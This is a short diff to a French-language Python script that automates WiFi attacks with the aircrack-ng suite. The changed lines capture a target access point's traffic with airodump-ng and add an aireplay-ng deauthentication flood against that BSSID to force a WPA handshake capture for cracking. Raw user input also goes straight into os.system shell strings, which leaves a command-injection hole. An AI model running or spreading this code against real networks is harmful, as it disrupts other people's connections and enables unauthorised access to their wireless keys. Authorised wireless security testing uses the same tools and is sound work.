@@ -17,9 +17,7 @@ elif choice == "1":
     os.system("sudo airodump-ng wlan0mon")
     bssid = input("Entrer le bssid : ")
     channel = input("Entrer le numero de channel : ")
-    print("Vous allez voir les clients selectionnez en un et faites la commande python3 airodump.py \"bssid\" \"client\" ")
-    time.sleep(4)
-    os.system("sudo airodump-ng -c " + channel + " --bssid " + bssid + " -w outpout wlan0mon ")
+    os.system("xterm -e 'sudo airodump-ng -c " + channel + " --bssid " + bssid + " -w outpout wlan0mon' & xterm -e 'aireplay-ng -0 15 -a " + bssid + " wlan0mon' ")
     print("Le handshake a ete capturee pour le cracker utiliser la commande ")
 
 elif choice == "2":
